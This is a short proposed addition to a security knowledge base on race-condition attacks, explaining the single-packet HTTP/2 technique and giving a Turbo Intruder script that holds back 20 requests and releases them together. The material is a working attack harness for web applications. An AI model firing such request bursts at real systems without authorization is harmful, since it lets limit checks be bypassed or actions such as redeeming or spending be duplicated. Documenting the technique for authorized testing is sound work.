# PROPOSAL (proposal) for docs/knowledge/class-race-conditions.md — kb-enrich 2026-07-03
_Review and apply manually; not auto-merged into the KB._

## Expanded technique reference (added 2026-07-03)

### Single-packet HTTP/2 attack — primary technique (Kettle, PortSwigger 2023; 2025 state of the art)

**How it works:** HTTP/2 multiplexes multiple requests in one TCP connection. By withholding the DATA frame until all request HEADERs are queued, then flushing everything simultaneously, all requests arrive at the server in one TCP packet. Network jitter collapses to ~1ms; the server processes them truly concurrently — the TOCTOU window is real.

**Turbo Intruder (Burp Pro) — correct script:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2,          # HTTP/2 required
        requestsPerConnection=20,
        pipeline=False
    )
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')           # flush all at once

def handleResponse(req, interesting):
    table.add(req)
